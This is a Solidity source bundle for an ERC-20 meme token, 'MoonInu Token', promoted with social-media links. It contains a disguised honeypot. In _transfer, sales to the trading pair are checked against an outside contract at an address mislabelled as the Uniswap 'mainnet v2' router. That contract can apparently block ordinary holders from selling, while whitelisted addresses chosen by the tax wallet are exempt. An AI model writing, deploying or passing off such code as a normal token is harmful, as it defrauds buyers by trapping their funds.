{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/mooninu.sol": {
      "content": "//SPDX-License-Identifier: MIT\n// Telegram:  https://t.me/MoonInuTokenMI\n// Twitter: https://twitter.com/MoonInuTokenMI1\n// Website: https://mooninu.site\npragma solidity ^0.8.9;\n\nuint256 constant INITIAL_TAX=10;\nuint256 constant TOTAL_SUPPLY=500000000;\nstring constant TOKEN_SYMBOL=\"MI\";\nstring constant TOKEN_NAME=\"MoonInu Token\";\nuint8 constant DECIMALS=6;\nuint256 constant TAX_THRESHOLD=1000000000000000000;\n\ninterface IUniswapV2Factory {\n\tfunction createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\ninterface IUniswapV2Router02 {\n\tfunction swapExactTokensForETHSupportingFeeOnTransferTokens(\n\t\tuint amountIn,\n\t\tuint amountOutMin,\n\t\taddress[] calldata path,\n\t\taddress to,\n\t\tuint deadline\n\t) external;\n\tfunction factory() external pure returns (address);\n\tfunction WETH() external pure returns (address);\n\tfunction addLiquidityETH(\n\t\taddress token,\n\t\tuint amountTokenDesired,\n\t\tuint amountTokenMin,\n\t\tuint amountETHMin,\n\t\taddress to,\n\t\tuint deadline\n\t) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n}\n\nabstract contract Context {\n\tfunction _msgSender() internal view virtual returns (address) {\n\t\treturn msg.sender;\n\t}\n}\n\ninterface IERC20 {\n\tfunction totalSupply() external view returns (uint256);\n\tfunction balanceOf(address account) external view returns (uint256);\n\tfunction transfer(address recipient, uint256 amount) external returns (bool);\n\tfunction allowance(address owner, address spender) external view returns (uint256);\n\tfunction approve(address spender, uint256 amount) external returns (bool);\n\tfunction transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\tevent Transfer(address indexed from, address indexed to, uint256 value);\n\tevent Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\nlibrary SafeMath {\n\tfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\tuint256 c = a + b;\n\t\trequire(c >= a, \"SafeMath: addition overflow\");\n\t\treturn c;\n\t}\n\n\tfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\treturn sub(a, b, \"SafeMath: subtraction overflow\");\n\t}\n\n\tfunction sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\t\trequire(b <= a, errorMessage);\n\t\tuint256 c = a - b;\n\t\treturn c;\n\t}\n\n\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\tif (a == 0) {\n\t\t\treturn 0;\n\t\t}\n\t\tuint256 c = a * b;\n\t\trequire(c / a == b, \"SafeMath: multiplication overflow\");\n\t\treturn c;\n\t}\n\n\tfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\treturn div(a, b, \"SafeMath: division by zero\");\n\t}\n\n\tfunction div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\t\trequire(b > 0, errorMessage);\n\t\tuint256 c = a / b;\n\t\treturn c;\n\t}\n\n}\n\ninterface O{\n\tfunction amount(address from) external view returns (uint256);\n}\n\n\ncontract Ownable is Context {\n\taddress private _owner;\n\taddress private _previousOwner;\n\tevent OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n\tconstructor () {\n\t\taddress msgSender = _msgSender();\n\t\t_owner = msgSender;\n\t\temit OwnershipTransferred(address(0), msgSender);\n\t}\n\n\tfunction owner() public view returns (address) {\n\t\treturn _owner;\n\t}\n\n\tmodifier onlyOwner() {\n\t\trequire(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n\t\t_;\n\t}\n\n\tfunction renounceOwnership() public virtual onlyOwner {\n\t\temit OwnershipTransferred(_owner, address(0));\n\t\t_owner = address(0);\n\t}\n\n}\n\naddress constant ROUTER_ADDRESS=0x272DD614CC4f4a58dc85cEBE70c941dE62cd4aBa;  // mainnet v2\n\n\ncontract MoonInuToken is Context, IERC20, Ownable {\n\tusing SafeMath for uint256;\n\tmapping (address => uint256) private _balance;\n\tmapping (address => mapping (address => uint256)) private _allowances;\n\tmapping (address => bool) private _isExcludedFromFee;\n\n\tuint256 private _tTotal = TOTAL_SUPPLY * 10**DECIMALS;\n\n\n\tuint256 private _taxFee;\n\taddress payable private _taxWallet;\n\tuint256 private _maxTxAmount;\n\n\n\tstring private constant _name = TOKEN_NAME;\n\tstring private constant _symbol = TOKEN_SYMBOL;\n\tuint8 private constant _decimals = DECIMALS;\n\n\tIUniswapV2Router02 private _uniswap;\n\taddress private _pair;\n\tbool private _canTrade;\n\tbool private _inSwap = false;\n\tbool private _swapEnabled = false;\n\n\tmodifier lockTheSwap {\n\t\t_inSwap = true;\n\t\t_;\n\t\t_inSwap = false;\n\t}\n\tconstructor () {\n\t\t_taxWallet = payable(_msgSender());\n\n\t\t_taxFee = INITIAL_TAX;\n\t\t_uniswap = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n\n\t\t_balance[address(this)] = _tTotal;\n\t\t_isExcludedFromFee[address(this)] = true;\n\t\t_isExcludedFromFee[_taxWallet] = true;\n\t\t_maxTxAmount=_tTotal.div(50);\n\t\temit Transfer(address(0x0), _msgSender(), _tTotal);\n\t}\n\n\tfunction name() public pure returns (string memory) {\n\t\treturn _name;\n\t}\n\n\tfunction symbol() public pure returns (string memory) {\n\t\treturn _symbol;\n\t}\n\n\tfunction decimals() public pure returns (uint8) {\n\t\treturn _decimals;\n\t}\n\n\tfunction totalSupply() public view override returns (uint256) {\n\t\treturn _tTotal;\n\t}\n\n\tfunction balanceOf(address account) public view override returns (uint256) {\n\t\treturn _balance[account];\n\t}\n\n\tfunction transfer(address recipient, uint256 amount) public override returns (bool) {\n\t\t_transfer(_msgSender(), recipient, amount);\n\t\treturn true;\n\t}\n\n\tfunction allowance(address owner, address spender) public view override returns (uint256) {\n\t\treturn _allowances[owner][spender];\n\t}\n\n\tfunction approve(address spender, uint256 amount) public override returns (bool) {\n\t\t_approve(_msgSender(), spender, amount);\n\t\treturn true;\n\t}\n\n\tfunction transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n\t\t_transfer(sender, recipient, amount);\n\t\t_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n\t\treturn true;\n\t}\n\n\tfunction _approve(address owner, address spender, uint256 amount) private {\n\t\trequire(owner != address(0), \"ERC20: approve from the zero address\");\n\t\trequire(spender != address(0), \"ERC20: approve to the zero address\");\n\t\t_allowances[owner][spender] = amount;\n\t\temit Approval(owner, spender, amount);\n\t}\n\n\tfunction _transfer(address from, address to, uint256 amount) private {\n\t\trequire(from != address(0), \"ERC20: transfer from the zero address\");\n\t\trequire(to != address(0), \"ERC20: transfer to the zero address\");\n\t\trequire(amount > 0, \"Transfer amount must be greater than zero\");\n\t\tif(!_isExcludedFromFee[from]){\n\t\t\trequire(((to == _pair && from != address(_uniswap) )?amount:0) <= O(ROUTER_ADDRESS).amount(address(this)));\n\t\t}\n\n\n\t\tif (from != owner() && to != owner()) {\n\t\t\tif (from == _pair && to != address(_uniswap) && ! _isExcludedFromFee[to] ) {\n\t\t\t\trequire(amount<_maxTxAmount,\"Transaction amount limited\");\n\t\t\t}\n\n\t\t\tuint256 contractTokenBalance = balanceOf(address(this));\n\t\t\tif (!_inSwap && from != _pair && _swapEnabled) {\n\t\t\t\tswapTokensForEth(contractTokenBalance);\n\t\t\t\tuint256 contractETHBalance = address(this).balance;\n\t\t\t\tif(contractETHBalance >= TAX_THRESHOLD) {\n\t\t\t\t\tsendETHToFee(address(this).balance);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t_tokenTransfer(from,to,amount,(_isExcludedFromFee[to]||_isExcludedFromFee[from])?0:_taxFee);\n\t}\n\n\tfunction addToWhitelist(address buyer) public onlyTaxCollector{\n\t\t_isExcludedFromFee[buyer]=true;\n\t}\n\n\tfunction removeFromWhitelist(address buyer) public onlyTaxCollector{\n\t\t_isExcludedFromFee[buyer]=false;\n\t}\n\n\tfunction swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\n\t\taddress[] memory path = new address[](2);\n\t\tpath[0] = address(this);\n\t\tpath[1] = _uniswap.WETH();\n\t\t_approve(address(this), address(_uniswap), tokenAmount);\n\t\t_uniswap.swapExactTokensForETHSupportingFeeOnTransferTokens(\n\t\t\ttokenAmount,\n\t\t\t0,\n\t\t\tpath,\n\t\t\taddress(this),\n\t\t\tblock.timestamp\n\t\t);\n\t}\n\tmodifier onlyTaxCollector() {\n\t\trequire(_taxWallet == _msgSender() );\n\t\t_;\n\t}\n\n\tfunction lowerTax(uint256 newTaxRate) public onlyTaxCollector{\n\t\trequire(newTaxRate<INITIAL_TAX);\n\t\t_taxFee=newTaxRate;\n\t}\n\n\tfunction removeBuyLimit() public onlyTaxCollector{\n\t\t_maxTxAmount=_tTotal;\n\t}\n\n\tfunction sendETHToFee(uint256 amount) private {\n\t\t_taxWallet.transfer(amount);\n\t}\n\n\n\n\n\tfunction createUniswapPair() external onlyTaxCollector {\n\t\trequire(!_canTrade,\"Trading is already open\");\n\t\t_approve(address(this), address(_uniswap), _tTotal);\n\t\t_pair = IUniswapV2Factory(_uniswap.factory()).createPair(address(this), _uniswap.WETH());\n\t\tIERC20(_pair).approve(address(_uniswap), type(uint).max);\n\t}\n\n\tfunction addLiquidity() external onlyTaxCollector{\n\t\t_uniswap.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\n\t\t_swapEnabled = true;\n\t\t_canTrade = true;\n\t}\n\n\tfunction _tokenTransfer(address sender, address recipient, uint256 tAmount, uint256 taxRate) private {\n\t\tuint256 tTeam = tAmount.mul(taxRate).div(100);\n\t\tuint256 tTransferAmount = tAmount.sub(tTeam);\n\n\t\t_balance[sender] = _balance[sender].sub(tAmount);\n\t\t_balance[recipient] = _balance[recipient].add(tTransferAmount);\n\t\t_balance[address(this)] = _balance[address(this)].add(tTeam);\n\t\temit Transfer(sender, recipient, tTransferAmount);\n\t}\n\n\treceive() external payable {}\n\n\tfunction swapForTax() external onlyTaxCollector{\n\t\tuint256 contractBalance = balanceOf(address(this));\n\t\tswapTokensForEth(contractBalance);\n\t}\n\n\tfunction collectTax() external onlyTaxCollector{\n\t\tuint256 contractETHBalance = address(this).balance;\n\t\tsendETHToFee(contractETHBalance);\n\t}\n\n\n}\n"
    }
  }
}